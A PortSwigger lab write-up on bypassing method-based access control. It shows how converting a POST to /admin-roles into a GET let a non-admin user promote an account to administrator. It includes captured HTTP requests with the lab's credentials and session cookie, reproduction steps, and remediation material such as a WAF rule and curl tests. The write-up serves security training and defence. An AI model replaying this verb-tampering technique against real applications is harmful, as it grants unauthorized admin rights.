# Method-Based Access Control Can Be Circumvented  

**Category**: 01-Broken-Access-Control  
**Lab_ID**: Method-Access-Bypass-001  
**Source**: PortSwigger  
**Date_Completed**: 2025-10-15  
**Tag**: `Broken-Access-Control`, `HTTP-Method`, `Verb-Tampering`, `GET-vs-POST`, `Authorization-Bypass`  

---

## Executive summary

The application restricts user role upgrades (e.g., promoting to admin) to **POST** requests on `/admin-roles`. When a **GET** request is sent to the same endpoint with query parameters (`?username=wiener&action=upgrade`), the server processes it **without proper authorization checks**, allowing any authenticated user to promote another account. By capturing a legitimate **POST** request and converting it to **GET** using Burp Suite's *"Change request method"*, a non-admin user can bypass method-based access control and escalate privileges. This was demonstrated by promoting `carlos` to admin.

**Result:** Non-admin user → converted `POST /admin-roles` → `GET /admin-roles?username=carlos&action=upgrade` → promoted `carlos` to admin.  
**Severity (subjective):** High — enables arbitrary privilege escalation.  
**Recommended immediate action:** Enforce **server-side authorization** on all HTTP methods; reject `GET` for state-changing actions.

---

## Objective

Bypass method-based access control to promote the user `carlos` to administrator using a non-admin account.

---

## Environment & tools

* Target: PortSwigger lab instance (`0a8e00ae0301ed8180adb71f00830051.web-security-academy.net`).  
* Tools: Burp Suite (Repeater, Proxy), modern browser.  
* Notes:  
  - Non-admin credentials: `wiener:peter`  
  - Session cookie: `session=5jnXJ46LPzspHCT01H44ihXRAMfdu`  
  - Endpoint: `/admin-roles`  
  - Parameters: `username`, `action=upgrade`

---

## Discovery  

1. Logged in as `wiener` → attempted to promote `carlos` via UI → request intercepted.  
2. Observed **POST** request with body: `username=carlos&action=upgrade`.  
3. Sent to **Burp Repeater** → changed method to invalid `POSTX` → received **400 "Missing parameter 'username'"** → confirmed parameter parsing depends on method.  
4. Used **"Change request method"** → auto-converted POST → **GET** with query string:  
   `GET /admin-roles?username=carlos&action=upgrade`  
5. Sent request → **successfully promoted `carlos` to admin**.

> Finding: The server **fails to enforce authorization on GET requests** to `/admin-roles`, treating them as valid upgrade actions.

---

## Reproduction steps  

1. Log in as `wiener:peter`.  
2. Promote `carlos` via the admin panel → **intercept POST request** to `/admin-roles`.  
3. Send to **Burp Repeater**.  
4. Right-click → **"Change request method"** → converts to:  
   `GET /admin-roles?username=carlos&action=upgrade`  
5. Send GET request → `carlos` promoted.  
6. Verify via lab completion.

**Captured Burp Suite HTTP interactions:**

**Request 1: Legitimate GET request (successful upgrade via method tampering)**
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a8e00ae0301ed8180adb71f00830051.web-security-academy.net
Cookie: session=5jnXJ46LPzspHCT01H44ihXRAMfdu
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="141", "Not=A?Brand";v="8", "Chromium";v="141"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0a8e00ae0301ed8180adb71f00830051.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8e00ae0301ed8180adb71f00830051.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
```

**Request 2: Invalid method test (POSTX → 400 error)**
```
POSTX /admin-roles HTTP/2
Host: 0a8e00ae0301ed8180adb71f00830051.web-security-academy.net
Cookie: session=5jnXJ46LPzspHCT01H44ihXRAMfdu
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a8e00ae0301ed8180adb71f00830051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8e00ae0301ed8180adb71f00830051.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=carlos&action=upgrade
```

**Response to POSTX:**
```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30

"Missing parameter 'username'"
```
<img width="719" height="344" alt="Screenshot 2025-10-23 210934" src="https://github.com/user-attachments/assets/b09f67ad-6422-42eb-8ef7-c810c3380769" />

---

## Observed impact

* Non-admin user can **promote any user to admin** using `GET`.  
* Full **privilege escalation** from any authenticated account.  
* Bypasses intended method restriction (`POST` only).  
* Potential for: account takeover, data access, system compromise.

---

## Root cause analysis

* **Primary cause:** Server **does not enforce authorization** on `GET /admin-roles` — processes upgrade action without role check.  
* **Secondary cause / contributing factor:**  
  - Assumes `GET` requests are read-only.  
  - No uniform authorization across HTTP methods.  
  - Reuses same endpoint for state-changing action via multiple methods.

---

## Risk assessment

* **Likelihood:** High — HTTP method is client-controlled; easily changed via Burp, curl, or dev tools.  
* **Impact:** Critical — arbitrary privilege escalation.  
* **Overall risk:** Critical.  
  Optionally map to CVSS: **High to Critical** (e.g., CVSS base score ~8.8) due to authenticated RCE-like escalation.

---

## Remediation  

### Immediate / short-term  

1. **Disable GET** on `/admin-roles` → return `405 Method Not Allowed`.  
2. Add WAF rule:  
   ```rule
   block if method=GET and path=/admin-roles and query contains "action=upgrade"
   ```

### Medium-term  

1. **Enforce server-side role check** on **all methods**:  
   ```python
   if not current_user.is_admin():
       return jsonify(error="Unauthorized"), 403
   ```
2. **Separate endpoints**:  
   - `POST /admin-roles` → state-changing  
   - `GET /admin-roles` → read-only (if needed)  
3. **Add CSRF token** to state-changing actions.  
4. **Reject GET with body/query for mutating actions**.

### Long-term / defensive controls

1. Use **centralized authorization middleware**.  
2. **Audit log** all role changes (user, method, target).  
3. Monitor for `GET` requests to admin mutation endpoints.  
4. Add automated tests:  
   ```bash
   GET /admin-roles?username=test&action=upgrade → 403
   ```
5. Enforce **POST-only** for all state-changing admin actions.

---

## Detection & verification guidance  

* Test `/admin-roles` with **all HTTP methods** (GET, POST, PUT, etc.).  
* Ensure **non-admin users get `403`** on all methods.  
* Use **Burp "Change request method"** in testing workflows.  
* Scan code for:  
  ```python
  if request.method == 'POST':  # ← only checks method, not role
  ```
* Add CI test:  
  ```bash
  curl -X GET -b "session=nonadmin" "/admin-roles?username=test&action=upgrade" → 403
  ```

---

## Suggested tests to add

* Integration test: `GET /admin-roles?...&action=upgrade` → `403` for non-admin.  
* Integration test: `PUT/DELETE /admin-roles` → `405`.  
* Security test: All mutation endpoints require `is_admin()` check.  
* Logging test: Role upgrade logs method, user, target.  
* Fuzz test: Send all HTTP methods to `/admin-roles`.

---

## References & further reading

* OWASP Top Ten — Broken Access Control  
* OWASP REST Security Cheat Sheet  
* PortSwigger: HTTP Verb Tampering  
* RFC 9110: HTTP Semantics  
* General guidance: **Never use HTTP method as authorization boundary**.

---

## Notes & lessons learned

* **HTTP methods are not security controls** — always pair with role-based checks.  
* **"Change request method" in Burp** = instant verb tampering test.  
* **Query strings in GET** can trigger mutations if not blocked.  
* **Defense-in-depth**: Method restriction + Authorization + CSRF.  
* Assume attackers will **GET everything**.

---

## Evidence & validation  

* `POST /admin-roles` with body → requires admin (assumed).  
* `POSTX` → `400 "Missing parameter"` → confirms parsing logic.  
* `GET /admin-roles?username=carlos&action=upgrade` → **success** as non-admin.
<img width="355" height="344" alt="Screenshot 2025-10-23 212601" src="https://github.com/user-attachments/assets/1092e6c8-5f42-4fb7-8ff5-a3b58d3b0f36" />

* `carlos` promoted → lab completed.

---

> **Legal & ethical reminder:** This writeup documents testing performed in a controlled PortSwigger lab environment. Do not apply these techniques to real systems without explicit authorization.
